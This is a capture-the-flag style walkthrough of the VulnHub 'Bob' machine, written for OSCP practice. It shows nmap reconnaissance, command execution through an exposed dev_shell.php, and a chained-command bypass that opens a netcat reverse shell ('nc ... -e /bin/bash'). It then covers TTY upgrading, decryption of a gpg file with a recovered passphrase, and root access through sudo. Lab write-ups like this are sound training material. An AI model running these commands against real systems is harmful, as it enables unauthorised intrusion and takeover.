---
title: BOB VULNHUB
date: 2021-08-31 12:30:00 +/-TTTT
categories: [Linux, Hacking, OSCP]
tags: [linux, oscp, hacking, vulnhub]     # TAG names should always be lowercase
---




### **BOB Vulnhub — OSCP_DAY-1**

  

### Introduction

Bob is an easy-level boot2root machine on VulnHub. It's one of the OSCP similar machines. I will add the link for the machine here. you can download it.

[**Bob: 1.0.1**  
](https://www.vulnhub.com/entry/bob-101,226/ "https://www.vulnhub.com/entry/bob-101,226/")[](https://www.vulnhub.com/entry/bob-101,226/)

Download the machine and configure it on ORACLE VIRTUAL BOX. VM-Ware having some Network stability issues there.

Let's begin……

### Reconnaissance

First of all, let's do Nmap subnet scanning to scan my subnet and find the IP of the target machine.

> >nmap -sn 192.168.1.0/24

![](https://cdn-images-1.medium.com/max/800/1*9tan2ILmRC72O0Mwd3PyGw.png)

Nmap subnet scanning

Here we found the domain name and IP of the target server.

#### IP: 192.168.1.4

after finding the IP, let us do the port scanning to find open ports, services, operating system, etc. we can start with TCP scanning.

> >nmap -sT -sV -oS nmap/tcp.out 192.168.1.4

![](https://cdn-images-1.medium.com/max/800/1*Tw8-FbU-IPnjYYj2yUioyQ.png)

oper ports

here I got two open ports. 21- FTP and 80 HTTP. also, I will do Nmap default script scanning here on given ports.

> >nmap -sC -sV -p 21,80 -oS nmap/default.txt 192.168.1.4

![](https://cdn-images-1.medium.com/max/800/1*d9kFunzlrgpxGkuRya2ppQ.png)

default script scanning

after doing this we found some files inside the web port. here I am not going for gobuster and further tools. now let's visit the files via a web browser.

the file dev_shell.php looks suspicious. but while visiting other files I don't get any sensitive content. so let's go for dev_shell.php

![](https://cdn-images-1.medium.com/max/800/1*IWoudlcbW1pMx2m9h9seNQ.png)

192.168.1.4/dev_shell.php

this PHP page looks like a web shell. let's check for remote code execution. while putting “id” there, it gives us user-id group id and further details. so using this dev_shell, we can execute commands remotely. I will add an extra reference about arbitrary code execution below. you can refer to this for further knowledge

[**Arbitrary code execution - Google Search**  
_Please click here if you are not redirected within a few seconds. In computer security, arbitrary code execution is an…_g.co](https://g.co/kgs/A7Puqx "https://g.co/kgs/A7Puqx")[](https://g.co/kgs/A7Puqx)

![](https://cdn-images-1.medium.com/max/800/1*PJ0opJqUNrRLAHvJbnIQbw.png)

RCE

But while executing some commands they show some errors.

![](https://cdn-images-1.medium.com/max/800/1*iX6BAaI_59oHLiwcA4QadQ.png)

so let's try some bypassing methodologies.

first, we have to set up a listener on my pc to handle incoming connections. using Netcat I am going to set up the listener.

> >nc -nvlp 1234

after that, I am going to execute this code in the dev_shell of the target server to get a reverse shell.

> >id & nc 192.168.1.7 1234 -e /bin/bash

after executing this code we got the reverse shell access in the Netcat listener.

![](https://cdn-images-1.medium.com/max/800/1*eCdHd7c5MFplsoSgSR7uRg.png)

initial foothold

in this target server, python3 is installed. so using python3 we can do shell spawning. The below page refers to shell spawning. you can refer to this page for further knowledge

[**Spawning a TTY Shell**  
_Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here…_netsec.ws](https://netsec.ws/?p=337 "https://netsec.ws/?p=337")[](https://netsec.ws/?p=337)

> python3 -- version

> python3 -c ‘import pty;pty.spawn(“/bin/bash”)’

![](https://cdn-images-1.medium.com/max/800/1*cn2lH_HTALmpXSnV8mOWAw.png)

Now it's time for privilege escalation. This machine's privilege escalation is a kind of treasure hunting, the password is stored somewhere under the server.

after visiting bob’s home folder I found a file called old_passwordfile.html which contains jc and seb user passwords. But nothing is interesting there. after few minutes of enumeration inside /home/bob/Documents/ , there are some sensitive contents and notes. also there is a file called login.txt.gpg which is protected.

![](https://cdn-images-1.medium.com/max/800/1*OPDokGl4avygu9sOna2hzA.png)

the staff.txt file contains some descriptions about other user-created by bob. now let's visit the Secret directory. inside subfolders, we found a script called notes.sh which contains the given content

![](https://cdn-images-1.medium.com/max/800/1*yDrrk5dN0rDxzpbIBPGOgg.png)

let's

take the first letter of all line as a password to open the encrypted data

#### Pass: HARPOCRATES

using the below command we can decrypt this encrypted file

> >gpg — batch — passphrase HARPOCRATES -d login.txt.gpg

![](https://cdn-images-1.medium.com/max/800/1*WXOTNILKLxTMz9_8A20uyg.png)

Now we got the bob user's password. Hopefully, Bob is the admin, so getting root access via bob’s account will be pretty easy

now switch the user to bob using the above password, and execute sudo -l to check sudo rights

> >sudo -l

and found that bob can execute everything as root. so using sudo su we will take root access

> >sudo su

![](https://cdn-images-1.medium.com/max/800/1*QrUbdx_u8y7A3U0wtFXcQw.png)

Now privilege escalation is completed. we got entire server access.
